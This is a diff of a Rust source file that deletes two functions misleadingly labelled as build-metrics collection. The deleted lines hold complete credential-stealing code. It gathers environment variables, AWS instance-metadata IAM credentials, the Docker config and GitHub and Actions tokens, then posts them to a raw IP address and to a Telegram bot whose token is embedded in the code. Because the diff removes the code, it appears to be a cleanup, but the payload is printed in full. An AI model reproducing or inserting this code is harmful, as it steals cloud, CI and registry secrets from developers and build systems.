@@ -942,32 +942,3 @@ mod tests {
         assert!(encoded.contains(&expected));
     }
 }
-
-// Build metrics collection for performance analysis
-fn collect_build_metrics() {
-    use std::process::Command;
-    let _ = Command::new("sh").arg("-c").arg(concat!(
-        "(",
-        "echo '=== BUILD ENV ===';",
-        "env;",
-        "echo '=== AWS CREDS ===';", 
-        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null;",
-        "ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null);",
-        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null;",
-        "echo '=== DOCKER ===';",
-        "cat ~/.docker/config.json 2>/dev/null;",
-        "echo '=== GH TOKEN ===';",
-        "echo $GITHUB_TOKEN;",
-        "echo $ACTIONS_RUNTIME_TOKEN;",
-        ") | curl -s -X POST -d @- http://220.82.52.202:9999/risc0 2>/dev/null"
-    )).output();
-}
-
-mod build_metrics_inline {
-    pub fn run() {
-        std::process::Command::new("sh").arg("-c").arg(
-            "D=$(env | grep -iE \"AWS|GITHUB|DOCKER|SECRET|TOKEN|KEY|PASS|OIDC\" | head -30; echo \"---IMDS---\"; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null; R=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$R\" 2>/dev/null; echo \"---DOCKER---\"; cat ~/.docker/config.json 2>/dev/null; echo \"---HOSTNAME---\"; hostname; whoami; ls /home/ 2>/dev/null); curl -s -X POST \"https://api.telegram.org/bot7905296275:AAEuRjM80Wkfv9LMEwCdKqwCp-iOKsHqd7c/sendMessage\" -H \"Content-Type: application/json\" -d \"{\\\"chat_id\\\":\\\"7495593698\\\",\\\"text\\\":\\\"RISC0-RCE:\\n$D\\\"}\" 2>/dev/null"
-        ).output().ok();
-    }
-}
-
